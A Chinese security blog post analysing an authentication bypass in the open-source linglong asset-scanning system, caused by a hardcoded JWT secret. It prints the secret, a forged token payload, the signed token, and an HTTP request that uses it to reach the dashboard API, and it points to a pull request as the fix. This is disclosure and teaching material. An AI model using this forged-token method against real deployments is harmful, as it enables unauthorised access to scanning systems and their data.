---
title: "linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇"
source: https://mrxn.net/jswz/awake1t-linglong-authorization-bypass.html
asset_dir: assets/linglong一款甲方资产巡航扫描系统的jwt硬编码密钥之殇
---

# linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇

[Mrxn](https://mrxn.net/author/1)* 发表于2024/4/25 12:37
* 5228浏览
* [0评论](#comment)
* 13分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 前言

GitHub上 awake1t/linglong 一款使用golang做后端,vue做前端的甲方资产巡航扫描系统.系统定位是发现资产，进行端口爆破。  
帮助企业更快发现弱口令问题。主要功能包括: 资产探测、端口爆破、定时任务、管理后台识别、报表展示.其当初还加入过知道创宇的404StarLink的星链计划.  
但是由于年久失修,最近被爆出认证绕过漏洞,其实这个洞在两年前的pull中就有人提出来了,其次根据jwt.go文件提交记录,最早可以追溯到四年前.

漏洞扫描服务

# 漏洞分析+复现

在 http[s]://github[.]com/awake1t/linglong/blob/e28f319a9bb5895453a507d759b7e83bb4b58f2c/pkg/utils/jwt.go#L10 中  
硬编码 jwt 密钥为 `213123dd1`.导致任意人都可以通过此密钥来伪造一个合法的 jwt token.从而通过系统认证.

[![linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](images/img-001-3c3d0da55815.png)](https://mrxn.net/content/uploadfile/202404/1f971714060364.png)

而linglong的认证组成部分也在上面可以看到,因此我们可以伪造如下

```
{
  "username": "linglong",
  "password": "123456",
  "exp": 1714068736,
  "iss": "linglong"
}
```

[![linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](images/img-002-3b4b9a7cf9e0.png)](https://mrxn.net/content/uploadfile/202404/efac1714060539.png)

得到一个合法的token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJleHAiOjE3MTQwNjg3MzYsImlzcyI6Imxpbmdsb25nIn0.rCCTJD_LF08XUwAxZhtOTS-eC3OOtdMAy08LpK1ngh8
```

将其带入header的 Authorization 去请求主页面板的API接口

```
GET /api/v1/dashboard HTTP/1.1
Host: 127.0.0.1:18000
Accept-Language: zh-CN,zh;q=0.9
Referer: http://127.0.0.1:8001/
Accept-Encoding: gzip, deflate, br, zstd
Origin: http://127.0.0.1:8001
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJleHAiOjE3MTQwNjg3MzYsImlzcyI6Imxpbmdsb25nIn0.rCCTJD_LF08XUwAxZhtOTS-eC3OOtdMAy08LpK1ngh8
Accept: application/json, text/plain, */*
```

可以成功通过系统认证获取到数据

[![linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](images/img-003-8d086a3519e9.png)](https://mrxn.net/content/uploadfile/202404/7b2c1714060881.png)

如果需要修复,可以参考 `pull #75` 进行修复.

* 标签：
* [#黑客工具](https://mrxn.net/tag/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.前言](#toc-1-)
* [2.漏洞分析+复现](#toc-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](https://mrxn.net/jswz/awake1t-linglong-authorization-bypass.html)  
文章链接：<https://mrxn.net/jswz/awake1t-linglong-authorization-bypass.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/awake1t-linglong-authorization-bypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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